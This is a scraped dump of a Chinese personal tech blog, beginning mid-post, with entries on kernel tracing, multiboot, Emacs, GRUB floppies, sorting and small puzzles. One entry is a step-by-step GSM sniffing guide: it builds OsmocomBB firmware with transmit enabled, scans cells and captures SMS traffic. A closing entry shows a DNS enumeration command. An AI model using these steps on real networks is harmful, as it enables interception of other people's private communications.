/root/.systemtap/cache/e4/stap_e4791a38e6be5d0d214949ecb8993460_1754.cPass 4: using cached /root/.systemtap/cache/e4/stap_e4791a38e6be5d0d214949ecb8993460_1754.koPass 5: starting run.sys_clone hitdo_fork return pid: 3584sys_clone hitdo_fork return pid: 3585sys_clone hitdo_fork return pid: 3586sys_clone hitdo_fork return pid: 3587sys_clone hitdo_fork return pid: 3588sys_clone hitdo_fork return pid: 3589sys_clone hitdo_fork return pid: 3590sys_clone hitdo_fork return pid: 3591sys_clone hitdo_fork return pid: 3592^CPass 5: run completed in 0usr/90sys/21392real ms. strace 输出： 1234567891011121314151617181920212223242526272829303132strace ./a.outexecve(&quot;./a.out&quot;, [&quot;./a.out&quot;], 0x7ffe513d4180 /* 32 vars */) = 0brk(NULL) = 0x9fa000mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f7c33df3000access(&quot;/etc/ld.so.preload&quot;, R_OK) = -1 ENOENT (No such file or directory)open(&quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3fstat(3, &#123;st_mode=S_IFREG|0644, st_size=67254, ...&#125;) = 0mmap(NULL, 67254, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f7c33de2000close(3) = 0open(&quot;/lib64/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3read(3, &quot;\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0&gt;\\0\\1\\0\\0\\0 \\6\\2\\0\\0\\0\\0\\0&quot;..., 832) = 832fstat(3, &#123;st_mode=S_IFREG|0755, st_size=2163016, ...&#125;) = 0mmap(NULL, 4000032, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f7c337fe000mprotect(0x7f7c339c5000, 2097152, PROT_NONE) = 0mmap(0x7f7c33bc5000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1c7000) = 0x7f7c33bc5000mmap(0x7f7c33bcb000, 14624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f7c33bcb000close(3) = 0mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f7c33ddf000arch_prctl(ARCH_SET_FS, 0x7f7c33ddf700) = 0mprotect(0x7f7c33bc5000, 16384, PROT_READ) = 0mprotect(0x600000, 4096, PROT_READ) = 0mprotect(0x7f7c33df5000, 4096, PROT_READ) = 0munmap(0x7f7c33de2000, 67254) = 0clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f7c33ddf9d0) = 3587child fstat(1, &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ...&#125;) = 0--- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=3587, si_uid=0, si_status=0, si_utime=0, si_stime=0&#125; ---brk(NULL) = 0x9fa000brk(0xa1b000) = 0xa1b000brk(NULL) = 0xa1b000write(1, &quot;parent &quot;, 7parent ) = 7exit_group(0) = ?+++ exited with 0 +++ 可以看到clone系统调用的返回值和_do_fork返回值一致，只是中间多生成了其他进程。","tags":["linux"]},{"title":"multiboot specification","path":"/2016/04/11/multiboot/","content":"0x00 background准备写一个玩具操作系统，所以启动过程少不了，不过启动过程周期只有一次，且细节繁复，单调。因为玩具系统是基于 x86 的，引用社区解决方案 multiboot[^multiboot] 可以模糊 x86 架构系统相关细节。 0x01 OS image formatSmall OS 被设计为基于 IA32 且是 multiboot os 这样它可能被链接到一个非默认加载地址以避开 PC 的 I&#x2F;O 区域或者其它的保留区域，但作为 multiboot OS 必须具有一个被称为 multiboot header 的头部信息，且必须完整的包含在 OS 的前 8192 字节内且 4 字节对齐。 12345678910MBOOT_PAGE_ALIGN equ 1 &lt;&lt; 0 ; Bit 0MBOOT_MEM_INFO equ 1 &lt;&lt; 1MBOOT_HEADER_MAGIC equ 0x1BADB002 ; Magic number from mboot standarMBOOT_HEADER_FLAGS equ MBOOT_PAGE_ALIGN | MBOOT_MEM_INFOMBOOT_HEADER_CHECKSUM equ -(MBOOT_HEADER_MAGIC+MBOOT_HEADER_FLAGS)section .textdd MBOOT_HEADER_MAGICdd MBOOT_HEADER_FLAGSdd MBOOT_HEADER_CHECKSUM MagicMagic 域是标志头的魔数，它必须等于十六进制值 0x1BADB002. FlagsFlags 域指出 OS 映像需要引导程序提供或支持的特性。0-15 位指出需求：如果引导程序发现某些值被设置但出于某种原因不理解或不能不能满足相应的需求，它必须告知用户并宣告引导失败。16-31 位指出可选的特性：如果引导程序不能支持某些位，它可以简单的忽略它们并正常引导。所有 flags 字中尚未定义的位必须被置为 0. 这样，flags 域既可以用于版本控制也可以用于简单的特性选择。如果设置了 flags 字中的 0 位，所有的引导模块将按页（4KB）边界对齐。有些操作系统能够在启动时将包含引导模块的页直接映射到一个分页的地址空间，因此需要引导模块是页对齐的。如果设置了 flags 字中的 1 位，则必须通过 Multiboot 信息结构的 mem_*域包括可用内存的信息。如果引导程序能够传递内存分布并且它确实存在，则也包括它。如果设置了 flags 字中的 2 位，有关视频模式表的信息必须对内核有效。如果设置了 flags 字中的 16 位，则 Multiboot 头中偏移量 8-24 的域有效，引导程序应该使用它们而不是实际可执行头中的域来计算将 OS 映象载入到那里。内核映象为 ELF 格式则不必提供这样的信息。 ChecksumChecksum 域 checksum 是一个 32 位的无符号值，当与其他的 magic 域（也就是 magic 和 flags）相加时，结果必须是 32 位的无符号值 0（即 magic + flags + checksum &#x3D; 0）. The address fields of Multiboot header所有由 flags 的第 16 位开启的地址域都是物理地址。它们的意义如下： header_addr包含对应于 Multiboot 头的开始处的地址——这也是 magic 值的物理地址。这个域用来同步 OS 映象偏移量和物理内存之间的映射。 load_addr包含 text 段开始处的物理地址。从 OS 映象文件中的多大偏移开始载入由头位置的偏移量定义，相减（header_addr - load_addr）.load_addr 必须小于等于 header_addr. load_end_addr, 包含 data 段结束处的物理地址。（load_end_addr - load_addr）指出了引导程序要载入多少数据。这暗示了 text 和 data 段必须在 OS 映象中连续；现有的 a.out 可执行格式满足这个条件。如果这个域为 0, 引导程序假定 text 和 data 段占据整个 OS 映象文件。 bss_end_addr, 包含 bss 段结束处的物理地址。引导程序将这个区域初始化为 0, 并保留这个区域以免将引导模块和其他的于查系统相关的数据放到这里。如果这个域为 0, 引导程序假定没有 bss 段。 entry_addr操作系统的入口点，引导程序最后将跳转到那里。 0x02 Machine state当引导程序调用 32 位操作系统时，机器状态必须如下： EAX 必须包含魔数 0x2BADB002；这个值指出操作系统是被一个符合 Multiboot 规范的引导程序载入的（这样就算是另一种引导程序也可以引导这个操作系统）. EBX 必须包含由引导程序提供的 Multiboot 信息结构的物理地址。 CS 必须是一个偏移量位于 0 到 0xFFFFFFFF 之间的 32 位可读 &#x2F; 可执行代码段。这里的精确值未定义。 Others register(DS,ES,FS,GS,SS), 必须是一个偏移量位于 0 到 0xFFFFFFFF 之间的 32 位可读 &#x2F; 可执行代码段。这里的精确值未定义。 A20 gate, 必须已经开启。 CR0 第 31 位（PG）必须为 0. 第 0 位（PE）必须为 1. 其他位未定义。 EFLAGS 第 17 位（VM）必须为 0. 第 9 位（IF）必须为 1. 其他位未定义。所有其他的处理器寄存器和标志位未定义。这包括： ESP 当需要使用堆栈时，OS 映象必须自己创建一个。 GDTR 尽管段寄存器像上面那样定义了，GDTR 也可能是无效的，所以 OS 映象决不能载入任何段寄存器（即使是载入相同的值也不行！）直到它设定了自己的 GDT. IDTR OS 映象必须在设置完它的 IDT 之后才能开中断。尽管如此，其他的机器状态应该被引导程序留做正常的工作顺序，也就是同 BIOS（或者 DOS, 如果引导程序是从那里启动的话）初始化的状态一样。换句话说，操作系统应该能够在载入后进行 BIOS 调用，直到它自己重写 BIOS 数据结构之前。还有，引导程序必须将 PIC 设定为正常的 BIOS&#x2F;DOS 状态，尽管它们有可能在进入 32 位模式时改变它们。 123456789/* 启动后，在 32 位内核进入点，机器状态如下 * 1. cs 指向基地址 0x00000000, 限长 1-4G 的代码段描述符 * 2. ds, ss, es, fs, gs 指向基地址 0x00000000, 限长 1-4G 的数据段描述符 * 3. A20 地址线已经被打开 * 4. 页机制被禁止 * 5. 中断被禁止 * 6. EAX = 0x2BADB002 * 7. 系统信息和启动信息块的线性地址保存在 ebx 中。 */ 0x03 Boot information在进入操作系统时 [^example],EBX 寄存器包含 Multiboot 信息数据结构的物理地址，引导程序通过它将重要的引导信息传递给操作系统。操作系统可以按自己的需要使用或者忽略任何部分；所有的引导程序传递的信息只是建议性的。Multiboot 信息结构和它的相关的子结构可以由引导程序放在任何位置（当然，除了保留给内核和引导模块的区域）. 如何在利用之前保护它是操作系统的责任。Multiboot 信息结构的格式如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576typedef struct multiboot_t &#123; /* multiboot version info 且是必须的 */ uint32_t flags; /* 如果 flags[0] 被置位则出现 * mem_lower 和 mem_upper 分别指出低端和高端内存的大小，单位是 k * 低端内存的首地址是 0, 高端内存首地址是 1M * 低端内存的最大值可能是 640k * 高端内存的最大值可能是最大值 -1M, 但并不保证是这个值。 */ uint32_t mem_lower; uint32_t mem_upper; /* 如果 flags[1] 被置位则出现，并指出引导程序从哪个 BIOS 磁盘设备载入的 OS 映像。 * 如果 OS 映像不是从一个 BIOS 磁盘载入的，这个域就决不能出现 (第 3 位必须是 0). * 操作系统可以使用这个域来帮助确定它的 root 设备，但并不一定要这样做。 */ uint32_t boot_device; /* 如果 flags[2] 被置位则出现，如果设置了 flags longword 的第 2 位， * 则 cmdline 域有效，并包含要传送给内核的命令行参数的物理地址。 * 命令行参数是一个正常 C 风格的以 0 终止的字符串。 */ uint32_t cmdline; /* 如果 flags[3] 被置位则出现，则 mods 域指出了同内核一同载入的有哪些引导模块， * 以及在哪里能找到它们.mods_count 包含了载入的模块的个数， * mods_addr 包含了第一个模块结构的物理地址。 */ uint32_t mods_count; uint32_t mods_addr; /* offset 28-30 syms * 如果 flags[4] 或 flags[5] 被置位则出现 (互斥), 这里是 5 被置位。 * ELF format section head, 参见 i386 ELF 文档以得到如何读取 section 头的更多的细节 */ uint32_t num; uint32_t size; uint32_t addr; uint32_t shndx; /* 如果 flags[6] 被置位则出现，指出保存由 BIOS 提供的内存分布的缓冲区的地址和长度。 * mmap_addr 是缓冲区的地址，mmap_length 是缓冲区的总大小。 */ uint32_t mmap_length; uint32_t mmap_addr; /* 如果 flags[7] 被置位则出现，则 drives_*域是有效的， * 指出第一个驱动器结构的物理地址和这个结构的大小。 * drives_addr 是地址，drives_length 是驱动器结构的总大小。 */ uint32_t drives_length; uint32_t drives_addr; /* 如果 flags[8] 被置位则出现，则 config_table 域有效， * 指出由 GET CONFIGURATION BIOS 调用返回的 ROM 配置表的物理地址。 * 如果这个 BIOS 调用失败了，则这个表的大小必须是 0. */ uint32_t config_table; /* 如果 flags[9] 则 boot_loader_name 域有效， * 包含了引导程序名字在物理内存中的地址。 * 引导程序名字是正常的 C 风格的以 0 中止的字符串 */ uint32_t boot_loader_name; uint32_t apm_table; /* 如果 flags[11] 被置位则 apm_table 域有效， 包含了如下 APM(高级电源管理) 表的物理地址：*/ uint32_t vbe_control_info; uint32_t vbe_mode_info; uint32_t vbe_mode; uint32_t vbe_interface_seg; uint32_t vbe_interface_off; uint32_t vbe_interface_len;&#125; __attribute__((packed)) multiboot_t; 在 flags[6] 被置位时候，则 mmap_*域有效，指出保存由 BIOS 提供的内存分布的缓冲区的地址和长度，缓冲区的结构： 12345678910111213141516/* size: 是相关结构的大小，单位是字节，它可能大于最小值 20. * base_addr_low: 是启动地址的低 32 位， * base_addr_high: 是高 32 位，启动地址总共有 64 位。 * length_low: length_low 是内存区域大小的低 32 位。 * length_high: 是内存区域大小的高 32 位，总共是 64 位。 * type: 是内存可用信息 1 代表可用，其他的代表保留区域 */ typedef struct mmap_entry_t &#123; uint32_t size; uint32_t base_addr_low; uint32_t base_addr_high; uint32_t length_low; uint32_t length_high; uint32_t type;&#125; __attribute__((packed)) mmap_entry_t; [^multiboot]: multiboot specification[^example]: example OS Code","tags":["specification"]},{"title":"emacs tips","path":"/2016/03/11/configure-emacs/","content":"0x00 cataloglinux 下面一般安装 gnu&#x2F;emacs: 1dnf install emacs -y mac 下面推荐 emacs-mac: 12brew tap railwaycat/emacsmacportbrew install emacs-mac --with-spacemacs-icon 配置文件使用spacemacs,它主要功能通过 layer 来切分配置单元，帮助节省配置时间。我目前常用的 layer 有： 12345678910111213141516171819202122232425262728c-c++osxhtmlgodockerdashchinesehaskellshell-scriptspythonauto-completionjavascriptycmdgtagsbetter-defaultsemacs-lispgitcolorsmarkdownorglualatex(shell :variables shell-default-height 30 shell-default-position &#x27;bottom)spell-checkingsyntax-checkingcscope 0x10 keybind[^faq]之前上课习惯使用 vs 的 F5 去编译运行程序，emacs 的默认配置里面不提供这样的功能，emacs 当提供类似的命令叫compile调用makefile来完成。可以通过 c mode hook bind F5 到compile命令： 123(add-hook &#x27;c-mode-hook&#x27; (lambda () (local-set-key (quote [f5]) (quote compile)))) 0x20 auto complete不同语言的补全记录。 0x21 C&#x2F;C++layer 里面对 C&#x2F;C++ 的补全提供了 ycmd-client, 这个插件服务器端还是需要自己编译安装，且 ycmd 每一个 project 都有一个叫.ycm_extra_conf.py的配置文件，其可以通过 YCM-Generator 来生成。 0x22 pythonpython 补全有个非常棒的插件 elpy! 也已经集成到 spacemacs 了！ It aims to provide an easy to install, fully-featured environment for Python development.[^elpy] 被动技能 -PEP8 风格检查 语法检查 自动补全 项目管理… 0x23 go在.spacemacs里面开启go-mode的 layer 并且安装相关命令行工具，go 开发环境就基本能用了。 1234567go get golang.org/x/tools/cmd/govendorgo get golang.org/x/tools/cmd/goimportsgo get golang.org/x/tools/cmd/gorenamego get github.com/rogpeppe/godefgo get golang.org/x/tools/cmd/gurugo get -u github.com/nsf/gocodego get golang.org/x/tools/cmd/godoc go 的环境变量 123...GOPATH=&quot;/Users/sn0rt/workspace/go&quot;... 默认安装遇到一个小坑就是不能补全第三方库，通过 gocode 的的设置可以修改autobuild 和 propose-builtins 12345678910# gocode setpropose-builtins truelib-path &quot;&quot;custom-pkg-prefix &quot;&quot;custom-vendor-dir &quot;&quot;autobuild trueforce-debug-output &quot;&quot;package-lookup-mode &quot;go&quot;close-timeout 1800unimported-packages false 在 spacemacs 里面也已经集成了，且静态分析工具换成了guru了！简直太棒了！ 0x30 latex在.spacemacs 里面开启 latex, 可以通过 bindkey 进行直接编译与查看页方便，不过对 ctex 宏包支持相对一般。 0x40 utils0x41 ircspacemacs 自带erc的 layer, 修改一行代码就能自动跑起来 irc 客户端，很是方便。而且可以 emacs 变成服务一直在后台这样 irc 就不用下线了 (记得 AFK). 0x42 git Magit is an interface to the version control system Git, implemented as an Emacs package. Magit aspires to be a complete Git porcelain. While we cannot (yet) claim that Magit wraps and improves upon each and every Git command, it is complete enough to allow even experienced Git users to perform almost all of their daily version control tasks directly from within Emacs. While many fine Git clients exist, only Magit and Git itself deserve to be called porcelains. 上面是介绍，非常值得尝试一下。 [^faq]: Emacs FAQ[^elpy]: Elpy","tags":["tips"]},{"title":"From a bootable floppy to booting","path":"/2016/03/10/make-a-bootable-floppy/","content":"0x00 foreword制作可启动软盘是为了弄明白 hurlex 项目里面那个软盘其制作过程 [^ubwiki], 后来想到启动是一个完成的过程便对这个笔记进行拓展，也就有了后面的软硬件启动过程。 0x01 install grub 0.97网上 wiki 太老，都是 base grub 1 的，所以使用 grub 0.97 节约时间，我系统是 fedora23 安装 grub 存在版本冲突，所以暂时卸载了 grub2. 具体的 rpm 可以在 [^download] 下载。 0x02 starting制作一个 1.44M 软盘，然后格式化成 ext2, 复制必要的文件，注意其中包含 menu.lst,grub.conf.上面两个文件可能在新安装 grub 0 的时候是没有。你需要自己 touch 一个同名文件，否则在交互模式的 setup (fd0) 的 install 阶段会出现严重错误导致指令失败。 123456dd if=/dev/zero of=floppy.img count=1 bs=1440kmke2fs floppy.imgmount floppy.img /mount/pointmkdir -p /mount/point/boot/grubcd /boot/grubcp stage1 stage2 menu.lst grub.conf /mount/point/boot/grub 进入 grub 0.97 的交互模式： 1234device (fd0) floppy.imgroot (fd0)setup (fd0)quit 0x03 testing安装 qemu 模拟器。 qemu-system-i386 floppy.img test-in-qemu 现在记得要把 grub0 卸载，安装回 grub2. 0x04 hardware booting[^ulk] 系统刚加电时候这个电脑的电路状态处于一片混沌 (不可预知). 北桥控制芯片向 cpu 引脚产生一个 RESET 的逻辑值，带电压稳定时候控制芯片撤销 reset 信号，就把处理器设置成特殊的值，并执行在 0xfffffff0 处的指令，从这里开始 cpu 就进入了”取指令 (IF)- 指令执行 (ID)- 循环”, 所以我要做的就说在各个阶段为 cpu 提供相关的数据。这个地址一般被映射到固定的 ROM 中，ROM 中存放着程序集在 x86 中通常被称为 BIOS, 因为 BIOS 里面包含几个中断驱动的低级过程，所有操作系统在启动时候都依赖这些过程对计算机进行设备初始化。 紧接着是 POST 过程，BIOS 对计算机各个部件进行初始化，这个阶段会显示一些信息，列如 bios 的版本，不过如今的计算机使用高级配置和开机界面 (ACPI) 标准，在 ACPI 兼容的 bios 中启动代码会简历几个表来描述当期系统的硬件设备。这些表的格式独立于设备生成商，而且可由操作系统读取以获得如何调用这些设备的信息。 初始化硬件设备，这个阶段在现代基于 PCI 的体系结构中相当重要，他保证了所有的硬件设备操作不会引起 IRQ 与 I&#x2F;O 端口的冲突，完成本阶段可以显示一个本系统中所有 PCI 设备的列表。 根据 BIOS 配置来搜索外部存储设备的第一个扇区来启动一个操作系统。 只要找到一个有效设备 (第一个扇区最后两个字节是 0x55,0xaa), 将其第一个扇区的内容拷贝到物理地址 0x00007c00 的开始位置，然后 ip 指向这里。 0x05 bootloader stage复制第一个扇区到指定内存地址，然后从那开始执行，惯例做法是在第一个扇区放上一个加载操作系统的程序等待被复制执行。早期的 linux 2.4 之前第一个扇区往往就是放着一个 bootloader, 以此在第一个扇区拷贝一个内核镜像就可以使软盘可启动。grub 就是这样一个加载操作系统的程序。下面这个指令就是 grub 交互模式中构造第一个扇区的指令的命令，讲 stage1 写入分区头部。 setup (fd0) 不同于现在，因为现在的内核规模变大第一个扇区放不下，所有交由专门的 bootloader 负载加载内核。 硬盘的第一个扇区是主引导记录 (MBR), 这个扇区包含一个小程序 (446bytes) 和一个分区表 (64bytes), 这个小程序用来装载被启动的操作系统所在分区的第一个扇区，下面 mbr 内存布局可以看见 0xaa55(小端字节序). 1234567#dd if=floopy.img of=temp bs=1 count=512#hexdump -x temp00001b0 0000 0000 0000 0000 0000 0000 0000 122400001c0 090f be00 7dbd c031 13cd 8a46 800c 00f900001d0 0f75 dabe e87d ffcf 9deb 6c46 706f 797000001e0 bb00 7000 01b8 b502 b600 cd00 7213 b6d700001f0 b501 e94f fee6 0000 0000 0000 0000 aa55 不同于 lilo,grub 可以从文件系统 ext2 和 ext3 中加载 Linux, 它是通过两个阶段的引导加载程序转换成三个阶段的引导加载程序来实现的。阶段 1(MBR) 引导一个阶段 1.5 的引导加载器，可以理解包含 linux 内核映像的特殊文件系统，当 stage1_5 被加载过后，stage2 就可以被接着加载了。 当阶段 2 加载之后，GRUB 就可以在请求时显示可用内核列表 (在 &#x2F;etc&#x2F;grub.conf 中定义，还有几个符号链接), 我们可以在那定制 grub 来控制启动。stage2 被加载到内存后，就可以对文件系统进行查询了，并将默认的 initrd 加载到内存中，stage2 的引导加载程序就可以调用内核映像了。 0x06 os booting[^linuxboot]当内核映像被加载到内存中，并且阶段 2 的引导加载程序释放控制权之后，内核阶段就开始。内核映像并不是一个可执行的内核，而是一个压缩过的内核映像。通常它是一个 zImage(压缩映像，小于 512KB 或一个 bzImage(较大的压缩映像，大于 512KB), 它是提前使用 zlib 进行压缩过的。在这个内核映像前面是一个例程，它实现少量硬件设置，并对内核映像中包含的内核进行解压，然后将其放入高端内存中，如果有初始 RAM 磁盘映像，就会将它移动到内存中，并标明以后使用。然后该例程会调用内核，并开始启动内核引导的过程。 当 bzImage(用于 i386 映像) 被调用时，我们从.&#x2F;arch&#x2F;i386&#x2F;boot&#x2F;head.S 的 start 汇编例程开始执行。这个例程会执行一些基本的硬件设置，并调用./arch/i386/boot/compressed/head.S中的 startup_32 例程。此例程会设置一个基本的环境 (堆栈等), 并清除 Block Started by Symbol(BSS). 然后调用一个叫做 decompress_kernel 的 C 函数 (在.&#x2F;arch&#x2F;i386&#x2F;boot&#x2F;compressed&#x2F;misc.c 中) 来解压内核。当内核被解压到内存中之后，就可以调用它了。这是另外一个 startup_32 函数，但是这个函数在.&#x2F;arch&#x2F;i386&#x2F;kernel&#x2F;head.S 中。 在这个新的 startup_32 函数 (也称为清除程序或进程 0) 中，会对页表进行初始化，并启用内存分页功能。然后会为任何可选的浮点单元 (FPU) 检测 CPU 的类型，并将其存储起来供以后使用。然后调用 start_kernel 函数 (在 init&#x2F;main.c 中), 它会将您带入与体系结构无关的 Linux 内核部分。实际上，这就是 Linux 内核的 main 函数。 通过调用 start_kernel, 会调用一系列初始化函数来设置中断，执行进一步的内存配置，并加载初始 RAM 磁盘。最后，要调用 kernel_thread(在 arch&#x2F;i386&#x2F;kernel&#x2F;process.c 中) 来启动 init 函数，这是第一个用户空间进程 (user-space process). 最后，启动空任务，现在调度器就可以接管控制权了 (在调用 cpu_idle 之后). 通过启用中断，抢占式的调度器就可以周期性地接管控制权，从而提供多任务处理能力。 在内核引导过程中，初始 RAM 磁盘 (initrd) 是由阶段 2 引导加载程序加载到内存中的，它会被复制到 RAM 中并挂载到系统上。这个 initrd 会作为 RAM 中的临时根文件系统使用，并允许内核在没有挂载任何物理磁盘的情况下完整地实现引导。由于与外围设备进行交互所需要的模块可能是 initrd 的一部分，因此内核可以非常小，但是仍然需要支持大量可能的硬件配置。在内核引导之后，就可以正式装备根文件系统了 (通过 pivot_root)：此时会将 initrd 根文件系统卸载掉，并挂载真正的根文件系统。 initrd 函数让我们可以创建一个小型的 Linux 内核，包括作为可加载模块编译的驱动程序。这些模块为内核提供了访问磁盘和磁盘上的文件系统的方法，并为其他硬件提供了驱动程序。由于根文件系统是磁盘上的一个文件系统，因此 initrd 函数会提供一种启动方法来获得对磁盘的访问，并挂载真正的根文件系统。 0x07 user interface当内核被引导并进行初始化之后，内核就可以启动自己的第一个用户空间应用程序了。这是第一个调用的使用标准 C 库编译的程序。在桌面 Linux 系统上，第一个启动的程序通常是 &#x2F;sbin&#x2F;init, 不过这是可选择的 (&#x2F;etc&#x2F;inittab). reference:[^ubwiki]: ubuntu wiki[^ulk]: 深入理解 Linux 操作系统[^linuxboot]: Linux 引导过程内幕[^download]: download","tags":["linux"]},{"title":"gsm sniffer","path":"/2015/09/14/gsm-sinffer/","content":"0x00 provision一个 Linux 系统，摩托罗拉 c118,T 型 minusb 数据线，Motorola c118&#x2F;c123 数据连接线，FT232 USB 转串口 TTL,Motorola C118&#x2F;c123 滤波器套件 (这个需要焊接技能，换滤波器可以捕获 uplink 信号), 感谢曾哥赞助这些玩具，可以到淘宝店一次买全。 0x01 software12345mkdir gprs_sniffercd gprs_sniffergit clone git://git.osmocom.org/osmocom-bb.gitgit clone git://git.osmocom.org/libosmocore.gitgit clone git://git.srlabs.de/gprsdecode.git 下载交叉编译环境 here, 某些 64 位的 linux 需要安装 32 的 glibc 的库。实验环境准备好，目录是这个样子 dir 0x02 debug environment12tar xf bu-2.15_gcc-3.4.3-c-c++-java_nl-1.12.0_gi-6.1.tar.bz2export PATH=$PATH:/root/gprs_sniffer/gnuarm-3.4.3/bin 解压交叉编译环境准备设置变量。 12345cd libosmocoreautoreconf -i./configuremakesudo make install autoreconf 工具由 automake 的包提供的。 12cd gprsdecodemake 这个模块并没有注意到什么地方用，是按照参考文档上的敲的 ^52. 12345cd osmocom-bbgit checkout --track origin/luca/gsmmapvim /root/gprs_sniffer/osmocom-bb/src/target/firmware/Makefile # 把 CFLAGS += -DCONFIG_TX_ENABLE 前的注释符号去掉cd srcmake -j8 处理 OsmocomBB 分支问题，亲测 luca&#x2F;gsmmap 可编译通过，而且需要把 mocom-bb&#x2F;src&#x2F;target&#x2F;firmwire&#x2F; 下的 Makefile 中的 CONFIG_TX_ENABLE 宏注释取消掉，不然一直在扫描没有结果。 0x03 sniffing12cd host/osmocon/sudo ./osmocon -p /dev/ttyUSB0 -m c123xor ../../target/firmware/board/compal_e88/layer1.compalram.bin 先把 c118 关机，然后确认和电脑的连接正常，输入上面的命令，按一下 c118 的红色电源键，刷入 layer1 的固件，会看到 c118 的手机屏幕显示。 12cd osmocom-bb/src/host/layer23/src/miscsudo ./cell_log -O 扫描基站信息，PWR 数值越大信号越好，注意是负数。 1sudo ./ccch_scan -i 127.0.0.1 -a 56 然后使用 ccch_scan 进行抓包，-a 参数为指定 ARFCN 号 1sudo wireshark -k -i lo -f &#x27;port 4729&#x27; 注意 wireshark 的 filiter 的写成 GSM_SMS. 0x04 demosms","tags":["security"]},{"title":"sort algorithms","path":"/2015/03/11/sort/","content":"学习一下几个基本的排序算法，记录供日后参考。 插入排序： 12345678void insert_sort(int nums[], int len)&#123; for (int i = 1, j = 0; i &lt; len; ++i) &#123; int temp = nums[i]; for (j = i - 1; j &gt;= 0 &amp;&amp; nums[j] &gt; temp; --j) nums[j+1] = nums[j]; nums[j+1] = temp; &#125;&#125; 冒泡排序 12345678void bsort(int nums[], int len)&#123; for (int i = 0; i &lt; len-1; i++) &#123; for (int j = 0; j &lt; len - i - 1; j++) &#123; if (nums[j] &gt; nums[j+1]) swap(nums[j], nums[j+1]); &#125; &#125;&#125; 快速排序 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;using namespace std;int partition(int nums[], int low, int high)&#123; int p = nums[high]; int i = low - 1; for (int j = low; j &lt;= high - 1; j++) &#123; if (nums[j] &lt; p) &#123; i++; swap(nums[i], nums[j]); &#125; &#125; swap(nums[i+1], nums[high]); return i + 1;&#125;void qsort(int nums[], int low, int high)&#123; if (low &lt; high) &#123; int i = partition(nums, low, high); qsort(nums, low, i-1); qsort(nums, i+1, high); &#125;&#125;void debug(int nums[], int last) &#123; for (int i = 0; i &lt;= last; i++) &#123; printf(&quot;%d &quot;, nums[i]); &#125; printf(&quot; &quot;);&#125;int main() &#123; int a[] = &#123;1, 3, 2, 3, 4, 1, 2, 6, 5, 9, 6&#125;; int size = sizeof(a)/sizeof(int); qsort(a, 0, size-1); debug(a, size-1);&#125;","tags":["algorithms"]},{"title":"to implement mymemcpy","path":"/2015/01/23/mymemcpy/","content":"考虑一下接口设计，内存覆盖，实现细节。 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;void mymemcpy(void * dest, const void * src, size_t len)&#123;\tassert((dest != NULL) &amp;&amp; (src != NULL));\tchar * pdest = (char *) dest;\tconst char * psrc = (const char *) src;\tif (pdest &gt; psrc &amp;&amp; pdest &lt; psrc + len) &#123; for (size_t i = len - 1; i != -1; --i) pdest[i] = psrc[i];\t&#125;\telse &#123; while(len--) *pdest++ = *psrc++;\t&#125;&#125;int main()&#123;\tconst char a[] = &quot;hello world&quot;;\tvoid *dest = malloc(23);\tmymemcpy(dest, a, 5);\tprintf(&quot;dest is %s &quot;, dest);\tmymemcpy(dest+1, dest, 5);\tprintf(&quot;dest is %s &quot;, dest);\tfree(dest);\treturn 0;&#125;","tags":["algorithms"]},{"title":"to implement rand7() by rand5()","path":"/2015/01/21/rand-7/","content":"主要思路是构造一个解空间映射$$A$$到另一个解空间$$B$$，就这个题目而言需要注意的是从$$A$$中值映射到$$B$$中值的数量应该是相等的。 按照上面思路： 构造一个$$5\\times 5 $$的矩阵循环填充 3 遍 1-7，共计 21 个取值空间其余以 0 补齐，如果返回值为 0，在来一次。 123456int val = 0;result[5 * 5] = [1, 2, 3, 4, 5, 6, 7, 1, 2, 3, 4, 5, 6, 7, 1, 2, 3, 4, 5, 6, 7, 0, 0, 0, 0];while (val == 0) &#123;val = result[rand5() * rand5()];&#125;rerurn val; 改良一下，其实这是需要 21 个解，即为 7 的倍数，如何靠 rand5() 的运算构造出就可以了。考虑一下 rand5() 最大是 5，最小是 1，则$$rand5() \\times rand5() &#x3D; [1, 25]$$, 然后取$$[1, 21]$$重新映射到$$[1, 7]$$。 demo： 123456789101112131415161718192021222324252627import randomdef rand5(): return random.randint(1, 5)# careful: 7 % 7 = 0, 14 % 7 = 0# so need i % 7 + 1def rand7(): while (True): i = 5 * (rand5() - 1) + rand5() if 21 &gt;= i: break return i % 7 + 1if __name__ == &quot;__main__&quot;: try: state = &#123;1: 0, 2: 0, 3: 0, 4: 0, 5: 0, 6: 0, 7: 0&#125; while (True): state[rand7()] += 1 except KeyboardInterrupt: print state exit","tags":["algorithms"]},{"title":"network security toolkit","path":"/2015/01/01/network-security-tools/","content":"0x00 Objective顺便借助主流工具，来介绍常规网络问题。 0x01 distributions: kali:From the creators of BackTrack comes Kali Linux, the most advanced and versatile penetration testing distribution ever created. We have a whole set of amazing features lined up in our security distribution, geared at streamlining the penetration testing experience. Backbox Linux:Another Ubuntu based distro but uses XFCE as its window manager and relies on its own repo to constantly keep its tools updated. Pentoo:A livecd based on Gentoo and XFCE. Also available as an overlay for existing Gentoo installations. Has the ability to crack passwords using GPGPU out of the box. 0x02 recce传统的本地 dns 探测工具，多数依赖于字典文件： 12dnsenum.pl -f dns_list.txt --dnserver 8.8.8.8 cisco.com -o 